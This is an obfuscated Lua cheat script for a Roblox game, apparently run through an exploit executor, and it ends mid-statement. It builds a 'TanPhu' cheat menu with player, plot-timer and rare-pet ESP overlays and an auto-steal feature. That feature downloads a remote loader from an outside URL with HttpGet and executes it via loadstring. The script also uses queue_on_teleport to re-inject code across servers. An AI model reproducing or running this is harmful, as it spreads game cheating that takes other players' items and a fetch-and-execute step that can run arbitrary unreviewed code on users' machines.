local UserInputService=game:GetService("UserInputService");local TweenService=game:GetService("TweenService");local Players=game:GetService("Players");local RunService=game:GetService("RunService");local Workspace=game:GetService("Workspace");local LocalPlayer=Players.LocalPlayer;UserInputService.InputBegan:Connect(function(input,processed) if ( not processed and (input.KeyCode==Enum.KeyCode.LeftControl)) then gui.Enabled= not gui.Enabled;end end);local gui=Instance.new("ScreenGui");gui.Name="TanPhuUI";gui.ResetOnSpawn=false;gui.Parent=game.CoreGui;gui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;local main=Instance.new("Frame");main.Parent=gui;main.Size=UDim2.new(0,650,0,400);main.Position=UDim2.new(0.5, -325,0.5, -200);main.BackgroundColor3=Color3.fromRGB(20,40,80);main.BackgroundTransparency=0.2;main.BorderSizePixel=0;Instance.new("UICorner",main).CornerRadius=UDim.new(0,12);local topBar=Instance.new("Frame");topBar.Parent=main;topBar.Size=UDim2.new(1,0,0,40);topBar.BackgroundColor3=Color3.fromRGB(10,20,60);topBar.BackgroundTransparency=0.1;topBar.BorderSizePixel=0;Instance.new("UICorner",topBar).CornerRadius=UDim.new(0,12);local title=Instance.new("TextLabel");title.Parent=topBar;title.Size=UDim2.new(1, -40,1,0);title.Position=UDim2.new(0,10,0,0);title.Text="TanPhu";title.Font=Enum.Font.GothamBold;title.TextSize=22;title.TextColor3=Color3.fromRGB(255,255,255);title.BackgroundTransparency=1;title.TextXAlignment=Enum.TextXAlignment.Left;local closeBtn=Instance.new("TextButton");closeBtn.Parent=topBar;closeBtn.Size=UDim2.new(0,30,0,30);closeBtn.Position=UDim2.new(1, -35,0.5, -15);closeBtn.Text="X";closeBtn.Font=Enum.Font.GothamBold;closeBtn.TextSize=18;closeBtn.TextColor3=Color3.fromRGB(255,255,255);closeBtn.BackgroundColor3=Color3.fromRGB(200,50,50);closeBtn.AutoButtonColor=true;Instance.new("UICorner",closeBtn).CornerRadius=UDim.new(0,6);closeBtn.MouseButton1Click:Connect(function() gui.Enabled= not gui.Enabled;end);do local FlatIdent_2953F=0;local AVATAR_FILE;local FALLBACK_IMG;local img;local avatarBtn;local uic;local stroke;while true do if (FlatIdent_2953F==3) then uic.CornerRadius=UDim.new(1,0);stroke=Instance.new("UIStroke",avatarBtn);stroke.Thickness=1.2;stroke.Color=Color3.fromRGB(0,170,255);FlatIdent_2953F=4;end if (FlatIdent_2953F==2) then avatarBtn.BackgroundTransparency=1;avatarBtn.Image=img;avatarBtn.Parent=gui;uic=Instance.new("UICorner",avatarBtn);FlatIdent_2953F=3;end if (FlatIdent_2953F==4) then stroke.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;avatarBtn.MouseButton1Click:Connect(function() gui.Enabled= not gui.Enabled;end);break;end if (1==FlatIdent_2953F) then avatarBtn=Instance.new("ImageButton");avatarBtn.Name="TP_AvatarToggle";avatarBtn.Size=UDim2.new(0,48,0,48);avatarBtn.Position=UDim2.new(0,10,0.5, -24);FlatIdent_2953F=2;end if (FlatIdent_2953F==0) then AVATAR_FILE="TanPhuHub/avatar.png";FALLBACK_IMG="rbxassetid://7072717697";img=FALLBACK_IMG;pcall(function() if (getcustomasset and isfile and isfile(AVATAR_FILE)) then img=getcustomasset(AVATAR_FILE);end end);FlatIdent_2953F=1;end end end local sidebar=Instance.new("Frame");sidebar.Parent=main;sidebar.Size=UDim2.new(0,160,1, -40);sidebar.Position=UDim2.new(0,0,0,40);sidebar.BackgroundColor3=Color3.fromRGB(15,30,60);sidebar.BackgroundTransparency=0.2;sidebar.BorderSizePixel=0;local sideLayout=Instance.new("UIListLayout",sidebar);sideLayout.Padding=UDim.new(0,6);sideLayout.FillDirection=Enum.FillDirection.Vertical;local content=Instance.new("Frame");content.Parent=main;content.Size=UDim2.new(1, -180,1, -60);content.Position=UDim2.new(0,170,0,50);content.BackgroundColor3=Color3.fromRGB(25,50,100);content.BackgroundTransparency=0.2;content.BorderSizePixel=0;Instance.new("UICorner",content).CornerRadius=UDim.new(0,10);local sideButtons={"Main","Stealer (New)","Helper","Player","Finder","Server","Discord"};local selectedButton;local contentTabs={};for _,txt in ipairs(sideButtons) do local FlatIdent_60EA1=0;local btn;local tabContent;while true do if (FlatIdent_60EA1==2) then btn.BackgroundColor3=Color3.fromRGB(30,60,120);btn.BackgroundTransparency=0.3;btn.AutoButtonColor=false;Instance.new("UICorner",btn).CornerRadius=UDim.new(0,8);FlatIdent_60EA1=3;end if (1==FlatIdent_60EA1) then btn.Text=txt;btn.Font=Enum.Font.GothamSemibold;btn.TextSize=14;btn.TextColor3=Color3.fromRGB(200,200,200);FlatIdent_60EA1=2;end if (FlatIdent_60EA1==4) then tabContent.Visible=false;contentTabs[txt]=tabContent;btn.MouseButton1Click:Connect(function() local FlatIdent_104D4=0;while true do if (FlatIdent_104D4==1) then TweenService:Create(btn,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(0,170,255),TextColor3=Color3.fromRGB(255,255,255)}):Play();for _,frame in pairs(contentTabs) do frame.Visible=false;end FlatIdent_104D4=2;end if (FlatIdent_104D4==2) then tabContent.Visible=true;break;end if (FlatIdent_104D4==0) then if selectedButton then TweenService:Create(selectedButton,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(30,60,120),TextColor3=Color3.fromRGB(200,200,200)}):Play();end selectedButton=btn;FlatIdent_104D4=1;end end end);if (txt=="Helper") then local FlatIdent_455BF=0;while true do if (FlatIdent_455BF==1) then selectedButton=btn;tabContent.Visible=true;break;end if (FlatIdent_455BF==0) then btn.BackgroundColor3=Color3.fromRGB(0,170,255);btn.TextColor3=Color3.fromRGB(255,255,255);FlatIdent_455BF=1;end end end break;end if (FlatIdent_60EA1==0) then btn=Instance.new("TextButton");btn.Parent=sidebar;btn.Size=UDim2.new(1, -12,0,35);btn.Position=UDim2.new(0,6,0,0);FlatIdent_60EA1=1;end if (FlatIdent_60EA1==3) then tabContent=Instance.new("Frame");tabContent.Parent=content;tabContent.Size=UDim2.new(1,0,1,0);tabContent.BackgroundTransparency=1;FlatIdent_60EA1=4;end end end do local FlatIdent_703C8=0;local makeBtn;local saveBtn;local loadBtn;while true do if (FlatIdent_703C8==3) then loadBtn.Position=UDim2.new(0,6,1, -70);saveBtn.MouseButton1Click:Connect(function() pcall(TP_SaveSettings,true);end);FlatIdent_703C8=4;end if (FlatIdent_703C8==2) then loadBtn=makeBtn("Load Settings");loadBtn.Parent=sidebar;FlatIdent_703C8=3;end if (FlatIdent_703C8==4) then loadBtn.MouseButton1Click:Connect(function() pcall(TP_LoadSettings,true);end);break;end if (FlatIdent_703C8==1) then saveBtn=makeBtn("Save Settings");saveBtn.Parent=sidebar;FlatIdent_703C8=2;end if (FlatIdent_703C8==0) then makeBtn=nil;function makeBtn(txt) local FlatIdent_E0D0=0;local b;while true do if (FlatIdent_E0D0==0) then b=Instance.new("TextButton");b.Size=UDim2.new(1, -12,0,30);b.Position=UDim2.new(0,6,1, -36);FlatIdent_E0D0=1;end if (FlatIdent_E0D0==2) then b.TextColor3=Color3.fromRGB(255,255,255);b.BackgroundColor3=Color3.fromRGB(0,170,255);b.AutoButtonColor=true;FlatIdent_E0D0=3;end if (FlatIdent_E0D0==1) then b.Text=txt;b.Font=Enum.Font.GothamSemibold;b.TextSize=13;FlatIdent_E0D0=2;end if (FlatIdent_E0D0==3) then Instance.new("UICorner",b).CornerRadius=UDim.new(0,8);return b;end end end FlatIdent_703C8=1;end end end local function createToggle(parent,text,description,order) local FlatIdent_324DE=0;local frame;local label;local toggle;local knob;local state;local callback;while true do if (7==FlatIdent_324DE) then toggle.MouseButton1Click:Connect(function() local FlatIdent_61EE=0;while true do if (0==FlatIdent_61EE) then state= not state;if state then local FlatIdent_6C033=0;while true do if (0==FlatIdent_6C033) then TweenService:Create(toggle,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(0,170,255)}):Play();TweenService:Create(knob,TweenInfo.new(0.2),{Position=UDim2.new(1, -21,0,1)}):Play();break;end end else local FlatIdent_5B2CE=0;while true do if (FlatIdent_5B2CE==0) then TweenService:Create(toggle,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(180,180,180)}):Play();TweenService:Create(knob,TweenInfo.new(0.2),{Position=UDim2.new(0,1,0,1)}):Play();break;end end end FlatIdent_61EE=1;end if (1==FlatIdent_61EE) then if callback then callback(state);end break;end end end);return {Frame=frame,SetCallback=function(fn) callback=fn;end};end if (FlatIdent_324DE==5) then toggle.AutoButtonColor=false;Instance.new("UICorner",toggle).CornerRadius=UDim.new(1,0);knob=Instance.new("Frame");knob.Parent=toggle;knob.Size=UDim2.new(0,20,0,20);FlatIdent_324DE=6;end if (FlatIdent_324DE==0) then frame=Instance.new("Frame");frame.Parent=parent;frame.Size=UDim2.new(1, -20,0,50);frame.BackgroundColor3=Color3.fromRGB(40,80,160);frame.BackgroundTransparency=0.2;FlatIdent_324DE=1;end if (FlatIdent_324DE==4) then toggle.Parent=frame;toggle.Size=UDim2.new(0,45,0,22);toggle.Position=UDim2.new(1, -60,0.5, -11);toggle.Text="";toggle.BackgroundColor3=Color3.fromRGB(180,180,180);FlatIdent_324DE=5;end if (FlatIdent_324DE==2) then label.Size=UDim2.new(0.7,0,1,0);label.Position=UDim2.new(0,10,0,0);label.Text=text   .. (((description~="") and ("\n"   .. description)) or "") ;label.Font=Enum.Font.Gotham;label.TextSize=14;FlatIdent_324DE=3;end if (FlatIdent_324DE==3) then label.TextColor3=Color3.fromRGB(230,230,230);label.TextXAlignment=Enum.TextXAlignment.Left;label.TextYAlignment=Enum.TextYAlignment.Center;label.BackgroundTransparency=1;toggle=Instance.new("TextButton");FlatIdent_324DE=4;end if (FlatIdent_324DE==6) then knob.Position=UDim2.new(0,1,0,1);knob.BackgroundColor3=Color3.fromRGB(255,255,255);Instance.new("UICorner",knob).CornerRadius=UDim.new(1,0);state=false;callback=nil;FlatIdent_324DE=7;end if (FlatIdent_324DE==1) then frame.BorderSizePixel=0;frame.Position=UDim2.new(0,10,0,(order-1) * 55 );Instance.new("UICorner",frame).CornerRadius=UDim.new(0,10);label=Instance.new("TextLabel");label.Parent=frame;FlatIdent_324DE=2;end end end local HttpService=game:GetService("HttpService");getgenv().TanPhuSettings=getgenv().TanPhuSettings or {toggles={},_autosave=true} ;local TP_REG={};local SETTINGS_DIR="TanPhuHub";local SETTINGS_PATH=SETTINGS_DIR   .. "/settings.json" ;local function TP_SaveSettings(notify) local payload={toggles=getgenv().TanPhuSettings.toggles or {} };local ok,json=pcall(function() return HttpService:JSONEncode(payload);end);if (ok and writefile) then pcall(function() local FlatIdent_2E9CB=0;while true do if (FlatIdent_2E9CB==0) then if (isfolder and  not isfolder(SETTINGS_DIR)) then makefolder(SETTINGS_DIR);end writefile(SETTINGS_PATH,json);break;end end end);end if notify then print("[TanPhu] Saved settings to "   .. SETTINGS_PATH );end end local function TP_LoadSettings(notify) local data=nil;if (readfile and isfile and isfile(SETTINGS_PATH)) then local FlatIdent_29E69=0;local ok1;local content;while true do if (FlatIdent_29E69==0) then ok1,content=pcall(readfile,SETTINGS_PATH);if ok1 then local FlatIdent_466B2=0;local ok2;local tbl;while true do if (FlatIdent_466B2==0) then ok2,tbl=pcall(function() return HttpService:JSONDecode(content);end);if (ok2 and (type(tbl)=="table")) then data=tbl;end break;end end end break;end end end data=data or {toggles=getgenv().TanPhuSettings.toggles or {} } ;for _,item in ipairs(TP_REG) do local FlatIdent_1A54=0;local desired;while true do if (0==FlatIdent_1A54) then desired=data.toggles and data.toggles[item.key] ;if ((desired~=nil) and item.widget and item.widget.ApplyState) then item.widget.ApplyState(desired);end break;end end end if notify then print("[TanPhu] Loaded settings");end end local _orig_createToggle=createToggle;function createToggle(parent,text,description,order) local FlatIdent_61800=0;local w;local toggleBtn;local knob;local _state;local _usercb;local _origSet;while true do if (FlatIdent_61800==3) then w.ApplyState=function(s) local FlatIdent_272FB=0;while true do if (FlatIdent_272FB==2) then if (toggleBtn and knob) then if s then TweenService:Create(toggleBtn,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(0,170,255)}):Play();TweenService:Create(knob,TweenInfo.new(0.2),{Position=UDim2.new(1, -21,0,1)}):Play();else local FlatIdent_521D6=0;while true do if (0==FlatIdent_521D6) then TweenService:Create(toggleBtn,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(180,180,180)}):Play();TweenService:Create(knob,TweenInfo.new(0.2),{Position=UDim2.new(0,1,0,1)}):Play();break;end end end end if _usercb then _usercb(s);end break;end if (FlatIdent_272FB==0) then s= not  not s;if (_state==s) then return;end FlatIdent_272FB=1;end if (1==FlatIdent_272FB) then _state=s;getgenv().TanPhuSettings.toggles[text]=s;FlatIdent_272FB=2;end end end;table.insert(TP_REG,{key=text,widget=w});FlatIdent_61800=4;end if (FlatIdent_61800==0) then w=_orig_createToggle(parent,text,description,order);toggleBtn,knob=nil,nil;FlatIdent_61800=1;end if (FlatIdent_61800==1) then for _,ch in ipairs(w.Frame:GetChildren()) do if ch:IsA("TextButton") then local FlatIdent_21DDC=0;while true do if (FlatIdent_21DDC==0) then toggleBtn=ch;knob=ch:FindFirstChildWhichIsA("Frame");break;end end end end _state,_usercb=false,nil;FlatIdent_61800=2;end if (FlatIdent_61800==2) then _origSet=w.SetCallback;w.SetCallback=function(fn) local FlatIdent_FA88=0;while true do if (FlatIdent_FA88==0) then _usercb=fn;_origSet(function(s) local FlatIdent_580CB=0;while true do if (FlatIdent_580CB==1) then if _usercb then _usercb(s);end TP_SaveSettings(false);break;end if (FlatIdent_580CB==0) then _state=s;getgenv().TanPhuSettings.toggles[text]=s;FlatIdent_580CB=1;end end end);break;end end end;FlatIdent_61800=3;end if (FlatIdent_61800==4) then return w;end end end task.defer(function() local FlatIdent_634AF=0;while true do if (0==FlatIdent_634AF) then task.wait(0.6);TP_LoadSettings(false);break;end end end);do local FlatIdent_4223E=0;local q;while true do if (FlatIdent_4223E==0) then q=queue_on_teleport or (syn and syn.queue_on_teleport) ;if (q and readfile and isfile and isfile(SETTINGS_PATH)) then local FlatIdent_6AEED=0;local ok;local content;while true do if (FlatIdent_6AEED==0) then ok,content=pcall(readfile,SETTINGS_PATH);if (ok and (type(content)=="string")) then local FlatIdent_5E109=0;local esc;while true do if (FlatIdent_5E109==0) then esc=content:gsub("\\","\\\\"):gsub("'","\\'");q(("pcall(function() local HttpService=game:GetService('HttpService'); getgenv().TanPhuSettings = HttpService:JSONDecode('%s') end)"):format(esc));break;end end end break;end end end break;end end end local helperTab=contentTabs['Helper'];local playerESPEnabled=false;local espConnections={};local function togglePlayerESP(state) playerESPEnabled=state;if state then for _,plr in ipairs(Players:GetPlayers()) do if ((plr~=LocalPlayer) and plr.Character) then local FlatIdent_2DA99=0;local highlight;local bb;local tl;while true do if (FlatIdent_2DA99==0) then highlight=Instance.new("Highlight");highlight.FillColor=Color3.fromRGB(0,0,255);highlight.FillTransparency=0.7;highlight.OutlineColor=Color3.fromRGB(0,0,255);FlatIdent_2DA99=1;end if (FlatIdent_2DA99==2) then bb.Size=UDim2.new(0,100,0,20);bb.StudsOffset=Vector3.new(0,2,0);bb.AlwaysOnTop=true;bb.Parent=plr.Character;FlatIdent_2DA99=3;end if (FlatIdent_2DA99==3) then tl=Instance.new("TextLabel");tl.Size=UDim2.new(1,0,1,0);tl.BackgroundTransparency=1;tl.Font=Enum.Font.GothamBold;FlatIdent_2DA99=4;end if (FlatIdent_2DA99==1) then highlight.Parent=plr.Character;bb=Instance.new("BillboardGui");bb.Name="ESP_Name";bb.Adornee=plr.Character:FindFirstChild("Head");FlatIdent_2DA99=2;end if (FlatIdent_2DA99==4) then tl.Text=plr.Name;tl.TextSize=14;tl.TextColor3=Color3.fromRGB(0,170,255);tl.Parent=bb;break;end end end end espConnections[ #espConnections + 1 ]=Players.PlayerAdded:Connect(function(plr) plr.CharacterAdded:Connect(function(char) if playerESPEnabled then local FlatIdent_82923=0;local highlight;local bb;local tl;while true do if (FlatIdent_82923==1) then highlight.Parent=char;bb=Instance.new("BillboardGui");bb.Name="ESP_Name";bb.Adornee=char:FindFirstChild("Head");FlatIdent_82923=2;end if (FlatIdent_82923==2) then bb.Size=UDim2.new(0,100,0,20);bb.StudsOffset=Vector3.new(0,2,0);bb.AlwaysOnTop=true;bb.Parent=char;FlatIdent_82923=3;end if (FlatIdent_82923==0) then highlight=Instance.new("Highlight");highlight.FillColor=Color3.fromRGB(0,0,255);highlight.FillTransparency=0.7;highlight.OutlineColor=Color3.fromRGB(0,0,255);FlatIdent_82923=1;end if (3==FlatIdent_82923) then tl=Instance.new("TextLabel");tl.Size=UDim2.new(1,0,1,0);tl.BackgroundTransparency=1;tl.Font=Enum.Font.GothamBold;FlatIdent_82923=4;end if (FlatIdent_82923==4) then tl.Text=plr.Name;tl.TextSize=14;tl.TextColor3=Color3.fromRGB(0,170,255);tl.Parent=bb;break;end end end end);end);else local FlatIdent_44100=0;while true do if (FlatIdent_44100==1) then espConnections={};break;end if (FlatIdent_44100==0) then for _,plr in ipairs(Players:GetPlayers()) do if plr.Character then local FlatIdent_89917=0;while true do if (FlatIdent_89917==0) then if plr.Character:FindFirstChildOfClass("Highlight") then plr.Character:FindFirstChildOfClass("Highlight"):Destroy();end if plr.Character:FindFirstChild("ESP_Name") then plr.Character:FindFirstChild("ESP_Name"):Destroy();end break;end end end end for _,con in ipairs(espConnections) do con:Disconnect();end FlatIdent_44100=1;end end end end local playerESPToggle=createToggle(helperTab,"ESP Player","Highlight & tên người chơi",1);playerESPToggle.SetCallback(togglePlayerESP);local _tp_timeline_folder=Instance.new("Folder");_tp_timeline_folder.Name="TP_PlotTimeline";_tp_timeline_folder.Parent=LocalPlayer:WaitForChild("PlayerGui");local _tp_timeline_active={};local _tp_timeline_conn_added=nil;local _tp_timeline_conn_render=nil;local function _tp_attach_timeline(plot) local FlatIdent_985A2=0;local rem;local main;local bb;local tl;while true do if (FlatIdent_985A2==5) then tl.TextScaled=true;tl.TextColor3=Color3.fromRGB(255,255,255);tl.TextStrokeTransparency=0.5;FlatIdent_985A2=6;end if (FlatIdent_985A2==2) then bb.Adornee=main;bb.Size=UDim2.new(0,90,0,32);bb.StudsOffset=Vector3.new(0,5,0);FlatIdent_985A2=3;end if (FlatIdent_985A2==6) then _tp_timeline_active[plot]={Gui=bb,Label=tl,Rem=rem};break;end if (3==FlatIdent_985A2) then bb.AlwaysOnTop=true;bb.Parent=_tp_timeline_folder;tl=Instance.new("TextLabel",bb);FlatIdent_985A2=4;end if (1==FlatIdent_985A2) then if ( not rem or  not main) then return;end bb=Instance.new("BillboardGui");bb.Name="TP_Timeline";FlatIdent_985A2=2;end if (FlatIdent_985A2==4) then tl.Size=UDim2.new(1,0,1,0);tl.BackgroundTransparency=1;tl.Font=Enum.Font.Gotham;FlatIdent_985A2=5;end if (FlatIdent_985A2==0) then if _tp_timeline_active[plot] then return;end rem=plot:FindFirstChild("RemainingTime",true);main=plot:FindFirstChild("Main",true) or plot:FindFirstChildWhichIsA("BasePart",true) ;FlatIdent_985A2=1;end end end local function _tp_clear_timeline() for plot,data in pairs(_tp_timeline_active) do if (data.Gui and data.Gui.Parent) then data.Gui:Destroy();end end _tp_timeline_active={};end local function _tp_enable_timeline() local FlatIdent_7147=0;while true do if (FlatIdent_7147==0) then for _,m in ipairs(Workspace:GetDescendants()) do if (m:IsA("Model") and (m.Name=="PlotBlock")) then pcall(function() _tp_attach_timeline(m);end);end end _tp_timeline_conn_added=Workspace.DescendantAdded:Connect(function(m) if (m:IsA("Model") and (m.Name=="PlotBlock")) then pcall(function() _tp_attach_timeline(m);end);end end);FlatIdent_7147=1;end if (FlatIdent_7147==1) then _tp_timeline_conn_render=RunService.RenderStepped:Connect(function() for plot,data in pairs(_tp_timeline_active) do if (data.Rem and data.Rem.Parent) then local FlatIdent_6D884=0;local n;while true do if (0==FlatIdent_6D884) then n=tonumber(string.match(tostring(data.Rem.Text or "" ),"(%d+)"));if (n and (n>0)) then local FlatIdent_5AA23=0;while true do if (FlatIdent_5AA23==0) then data.Label.Text=tostring(n)   .. "s" ;data.Gui.Enabled=true;break;end end elseif data.Gui then data.Gui.Enabled=false;end break;end end elseif data.Gui then data.Gui.Enabled=false;end end end);break;end end end local function _tp_disable_timeline() if _tp_timeline_conn_added then local FlatIdent_6DFD9=0;while true do if (FlatIdent_6DFD9==0) then _tp_timeline_conn_added:Disconnect();_tp_timeline_conn_added=nil;break;end end end if _tp_timeline_conn_render then local FlatIdent_5202D=0;while true do if (0==FlatIdent_5202D) then _tp_timeline_conn_render:Disconnect();_tp_timeline_conn_render=nil;break;end end end _tp_clear_timeline();end createToggle(contentTabs['Helper'],"ESP Timeline","Hiện timer plot (trắng nhỏ)",2).SetCallback(function(state) if state then _tp_enable_timeline();else _tp_disable_timeline();end end);local _tp_steal_thread=nil;local _tp_steal_toggle=createToggle(contentTabs['Helper'],"Feeling Steal","Auto steal (load/kill)",3);_tp_steal_toggle.SetCallback(function(state) if state then if _tp_steal_thread then local FlatIdent_C595=0;while true do if (FlatIdent_C595==0) then task.cancel(_tp_steal_thread);_tp_steal_thread=nil;break;end end end _tp_steal_thread=task.spawn(function() local ok,err=pcall(function() local FlatIdent_6147E=0;local code;local fn;while true do if (FlatIdent_6147E==0) then code=game:HttpGet("https://api.luarmor.net/files/v3/loaders/a3e13a4a85ac4c2da17a6baab051ee1b.lua");fn=loadstring(code);FlatIdent_6147E=1;end if (FlatIdent_6147E==1) then if fn then fn();end break;end end end);if  not ok then warn("[Feeling Steal] load error:",err);end end);else if _tp_steal_thread then task.cancel(_tp_steal_thread);_tp_steal_thread=nil;end warn("[Feeling Steal] Toggle off: đã cancel thread (nếu script remote vẫn chạy, cần reload game để dọn sạch).");end end);do local _pet_rules={{k="graipuss medussi",min=0,max=0},{k="la grande combinasion",min=0,max=0},{k="los combinasionas",min=0,max=0},{k="nuclearo dinossauro",min=0,max=0},{k="los hotspotsitos",min=0,max=0},{k="garama and madundung",min=0,max=0}};local function _norm(s) return tostring(s or "" ):lower();end local function _get_rule_hit_in_tree(root) local FlatIdent_1D701=0;local nameL;local ok;local descs;while true do if (FlatIdent_1D701==0) then nameL=_norm(root.Name);for _,r in ipairs(_pet_rules) do if nameL:find(r.k,1,true) then return r,root.Name;end end FlatIdent_1D701=1;end if (FlatIdent_1D701==2) then return nil;end if (1==FlatIdent_1D701) then ok,descs=pcall(root.GetDescendants,root);if (ok and (type(descs)=="table")) then for i=1, #descs do local d=descs[i];local dn=_norm(d.Name);for _,r in ipairs(_pet_rules) do if dn:find(r.k,1,true) then return r,d.Name;end end if (d:IsA("TextLabel") or d:IsA("TextButton")) then local FlatIdent_8B7B0=0;local t;while true do if (FlatIdent_8B7B0==0) then t=_norm(d.Text);for _,r in ipairs(_pet_rules) do if t:find(r.k,1,true) then return r,d.Text;end end break;end end elseif d:IsA("StringValue") then local FlatIdent_35AC5=0;local v;while true do if (FlatIdent_35AC5==0) then v=_norm(d.Value);for _,r in ipairs(_pet_rules) do if v:find(r.k,1,true) then return r,d.Value;end end break;end end end end end FlatIdent_1D701=2;end end end local function _parse_mps(val) local FlatIdent_506A5=0;local s;local num;while true do if (FlatIdent_506A5==1) then num=tonumber((s:match("([%d%.]+)")) or "0" ) or 0 ;if s:find("b",1,true) then num=num * 1000000000 ;elseif s:find("m",1,true) then num=num * 1000000 ;elseif s:find("k",1,true) then num=num * 1000 ;end FlatIdent_506A5=2;end if (2==FlatIdent_506A5) then return math.floor(num + 0.5 );end if (FlatIdent_506A5==0) then if (typeof(val)=="number") then return val;end s=_norm(val);FlatIdent_506A5=1;end end end local function _text_is_per_sec(txt) local FlatIdent_14454=0;local s;while true do if (FlatIdent_14454==0) then s=_norm(txt);return s:find("/s",1,true) or s:find("per%s*sec") or s:find("per%s*second") ;end end end local _deny={"offline","cash","total","bank","balance","wallet","coins","gems","price","cost","buy","sell","collect","collected"};local function _has_token(s,toks) local FlatIdent_37555=0;while true do if (FlatIdent_37555==1) then return false;end if (FlatIdent_37555==0) then s=_norm(s);for _,t in ipairs(toks) do if s:find(t,1,true) then return true;end end FlatIdent_37555=1;end end end local function _collect_prices(container) local list={};local ok,descs=pcall(container.GetDescendants,container);if ( not ok or (type(descs)~="table")) then return list;end for i=1, #descs do local d=descs[i];local nm_l=_norm(d.Name);if  not _has_token(nm_l,_deny) then if (d:IsA("TextLabel") or d:IsA("TextButton")) then local FlatIdent_7D3C9=0;local t;while true do if (0==FlatIdent_7D3C9) then t=d.Text or "" ;if ((t~="") and _text_is_per_sec(t) and  not _has_token(t,_deny)) then local FlatIdent_270C=0;local n;while true do if (FlatIdent_270C==0) then n=_parse_mps(t);if (n>0) then list[ #list + 1 ]=n;end break;end end end break;end end elseif d:IsA("StringValue") then local FlatIdent_5CC3B=0;local v;while true do if (0==FlatIdent_5CC3B) then v=d.Value;if ((type(v)=="string") and _text_is_per_sec(v) and  not _has_token(v,_deny)) then local FlatIdent_B322=0;local n;while true do if (FlatIdent_B322==0) then n=_parse_mps(v);if (n>0) then list[ #list + 1 ]=n;end break;end end end break;end end elseif (d:IsA("NumberValue") or d:IsA("IntValue")) then local FlatIdent_84ED3=0;local n;while true do if (0==FlatIdent_84ED3) then n=tonumber(d.Value) or 0 ;if (n>0) then list[ #list + 1 ]=n;end break;end end end end end return list;end local function _fmt_short(n) local FlatIdent_40FD3=0;while true do if (FlatIdent_40FD3==0) then n=tonumber(n) or 0 ;if (n>=1000000000) then return ("$%.2fB/s"):format(n/1000000000 ):gsub("%.?0+B","B");elseif (n>=1000000) then return ("$%.2fM/s"):format(n/1000000 ):gsub("%.?0+M","M");elseif (n>=1000) then return ("$%.2fK/s"):format(n/1000 ):gsub("%.?0+K","K");else return ("$%d/s"):format(n);end break;end end end local petESPEnabled=false;local petESPItems={};local addedConn;local function _cleanup_one(m) local FlatIdent_740DC=0;local rec;while true do if (FlatIdent_740DC==0) then rec=petESPItems[m];if rec then if (rec.hl and rec.hl.Parent) then rec.hl:Destroy();end if (rec.gui and rec.gui.Parent) then rec.gui:Destroy();end petESPItems[m]=nil;end break;end end end local function _attach_one(model) local FlatIdent_1CFC3=0;local rule;local hitText;local adornee;local prices;local add;local hl;local bb;local holder;local tl;local tsc;local nameText;local tag;while true do if (FlatIdent_1CFC3==1) then if  not adornee then return;end prices={};add=nil;function add(src) if  not src then return;end local ok,list=pcall(_collect_prices,src);if (ok and (type(list)=="table")) then for i=1, #list do prices[ #prices + 1 ]=list[i];end end end FlatIdent_1CFC3=2;end if (FlatIdent_1CFC3==12) then nameText=tostring(hitText or model.Name );tag=nameText;if ( #prices>=2) then tag=("%s  (%s → %s)"):format(nameText,_fmt_short(prices[1]),_fmt_short(prices[ #prices]));elseif ( #prices==1) then tag=("%s  (%s)"):format(nameText,_fmt_short(prices[1]));end tl.Text=tag;FlatIdent_1CFC3=13;end if (FlatIdent_1CFC3==8) then tl=Instance.new("TextLabel");tl.Parent=holder;tl.Size=UDim2.new(1, -10,1, -2);tl.Position=UDim2.new(0,5,0,1);FlatIdent_1CFC3=9;end if (FlatIdent_1CFC3==5) then bb.Size=UDim2.new(0,120,0,24);bb.StudsOffset=Vector3.new(0,3.5,0);bb.AlwaysOnTop=true;bb.LightInfluence=0;FlatIdent_1CFC3=6;end if (7==FlatIdent_1CFC3) then holder.BackgroundColor3=Color3.fromRGB(20,20,20);holder.BackgroundTransparency=0.25;holder.BorderSizePixel=0;Instance.new("UICorner",holder).CornerRadius=UDim.new(0,6);FlatIdent_1CFC3=8;end if (FlatIdent_1CFC3==10) then tl.TextYAlignment=Enum.TextYAlignment.Center;tl.TextColor3=Color3.fromRGB(255,255,255);tl.TextStrokeColor3=Color3.fromRGB(0,0,0);tl.TextStrokeTransparency=0;FlatIdent_1CFC3=11;end if (FlatIdent_1CFC3==0) then if petESPItems[model] then return;end rule,hitText=_get_rule_hit_in_tree(model);if  not rule then return;end adornee=model:FindFirstChild("Head") or model:FindFirstChildWhichIsA("BasePart",true) ;FlatIdent_1CFC3=1;end if (FlatIdent_1CFC3==6) then bb.Parent=model;holder=Instance.new("Frame");holder.Parent=bb;holder.Size=UDim2.new(1,0,1,0);FlatIdent_1CFC3=7;end if (FlatIdent_1CFC3==2) then add(model);add(model.Parent);table.sort(prices);hl=Instance.new("Highlight");FlatIdent_1CFC3=3;end if (FlatIdent_1CFC3==11) then tsc=Instance.new("UITextSizeConstraint");tsc.Parent=tl;tsc.MinTextSize=10;tsc.MaxTextSize=18;FlatIdent_1CFC3=12;end if (FlatIdent_1CFC3==4) then hl.Parent=model;bb=Instance.new("BillboardGui");bb.Name="TP_PetESP";bb.Adornee=adornee;FlatIdent_1CFC3=5;end if (FlatIdent_1CFC3==9) then tl.BackgroundTransparency=1;tl.Font=Enum.Font.GothamSemibold;tl.TextScaled=true;tl.TextXAlignment=Enum.TextXAlignment.Center;FlatIdent_1CFC3=10;end if (FlatIdent_1CFC3==3) then hl.FillColor=Color3.fromRGB(255,255,255);hl.FillTransparency=0.9;hl.OutlineColor=Color3.fromRGB(255,255,255);hl.OutlineTransparency=0.25;FlatIdent_1CFC3=4;end if (13==FlatIdent_1CFC3) then model.AncestryChanged:Connect(function(_,parent) if  not parent then _cleanup_one(model);end end);petESPItems[model]={hl=hl,gui=bb};break;end end end local function _enable_pet_esp() local FlatIdent_5C0FA=0;while true do if (FlatIdent_5C0FA==0) then for _,m in ipairs(Workspace:GetDescendants()) do if m:IsA("Model") then pcall(_attach_one,m);end end addedConn=Workspace.DescendantAdded:Connect(function(inst) if (petESPEnabled and inst:IsA("Model")) then pcall(_attach_one,inst);end end);break;end end end local function _disable_pet_esp() local FlatIdent_2C453=0;while true do if (FlatIdent_2C453==0) then if addedConn then local 